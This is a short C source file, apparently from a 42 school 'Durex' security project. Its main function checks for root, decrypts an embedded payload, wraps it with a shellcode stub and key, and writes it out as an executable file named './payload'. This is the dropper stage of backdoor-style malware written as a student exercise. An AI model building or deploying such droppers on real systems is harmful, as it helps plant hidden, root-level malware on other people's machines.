/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: alagroy- <alagroy-@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/08/14 17:28:28 by vscode            #+#    #+#             */
/*   Updated: 2021/12/02 13:05:27 by alagroy-         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"

int     main(void)
{
    byte    *payload;
    int     len;

    if (geteuid())
    {
        dprintf(STDERR_FILENO, ROOT_ERROR_MSG);
        exit(1);
    }
    puts("alagroy-");
    if (!(payload = decrypt_payload(g_payload, &len)))
        return (-1);
    payload = encrypt_binary(payload, len);
    int fd = open("./payload", O_WRONLY | O_CREAT | O_TRUNC, 0755);
    write(fd, payload, len + SHELLCODE_LEN + KEY_LEN);
    close(fd);
    return (0);
}